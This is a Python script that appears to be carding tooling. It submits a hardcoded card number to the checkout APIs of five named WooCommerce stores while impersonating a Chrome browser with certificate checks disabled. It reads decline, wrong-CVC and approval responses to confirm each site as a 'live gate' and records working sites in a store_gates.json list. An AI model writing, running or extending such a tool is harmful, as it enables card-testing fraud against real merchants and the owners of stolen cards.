import asyncio, sys, os, json, time
sys.path.insert(0, os.path.abspath("."))
sys.stdout.reconfigure(line_buffering=True, encoding="utf-8")
from curl_cffi.requests import AsyncSession
import gate_client as gc

targets = [
    ("brentrobitaille.com", 3500),
    ("layers-of-learning.com", 3500),
    ("weinistgeil.de", 3500),
    ("cuttingfluid.online", 3500),
    ("madatshop.com", 3500),
]

async def test_domain(dom, max_price):
    url = f"https://{dom}"
    print(f"\n[*] Testing {dom}...")
    card = "4539274558237997|06|2029|981"
    async with AsyncSession(impersonate="chrome120", verify=False) as s:
        try:
            res = await asyncio.wait_for(
                gc.store_api_confirm(s, url, "", card, max_price_cents=max_price),
                timeout=25
            )
            st = res.get("status")
            det = res.get("detail", "")
            amt = res.get("amount_cents")
            curr = res.get("currency")
            print(f"  -> {dom}: [{st}] amt={amt} {curr} | {det[:120]}")
            if st in ("DECLINED", "INSUFFICIENT_FUNDS", "WRONG_CVC", "3DS_CHALLENGE", "APPROVED@HOLD", "APPROVED@PAID"):
                print(f"  [+] LIVE GATE CONFIRMED: {dom}!")
                # update store_gates.json
                data = json.load(open("data/store_gates.json", encoding="utf-8"))
                found = False
                for g in data:
                    if g["domain"] == dom:
                        g["verified"] = True
                        g["status"] = "STORE_LIVE"
                        g["verify_status"] = st
                        g["verify_detail"] = det
                        g["battle_result"] = "LIVE"
                        g["cheapest_cents"] = amt
                        g["currency"] = curr
                        found = True
                        break
                if not found:
                    data.insert(0, {
                        "domain": dom,
                        "base_url": url,
                        "gate_type": "woo_store_api",
                        "store_nonce": True,
                        "cheapest_cents": amt,
                        "currency": curr,
                        "updated_at": int(time.time()),
                        "status": "STORE_LIVE",
                        "verified": True,
                        "verify_status": st,
                        "verify_detail": det,
                        "phantom": False,
                        "dead_surface": False,
                        "battle_check": time.strftime("%Y-%m-%d"),
                        "battle_result": "LIVE",
                    })
                json.dump(data, open("data/store_gates.json", "w", encoding="utf-8"), indent=2, ensure_ascii=False)
                print(f"  [+] Saved to store_gates.json! Total verified: {sum(1 for x in data if x.get('verified'))}")
        except asyncio.TimeoutError:
            print(f"  -> {dom}: TIMEOUT (25s)")
        except Exception as e:
            print(f"  -> {dom}: EXC {e}")

async def main():
    for d, m in targets:
        await test_domain(d, m)

if __name__ == "__main__":
    asyncio.run(main())
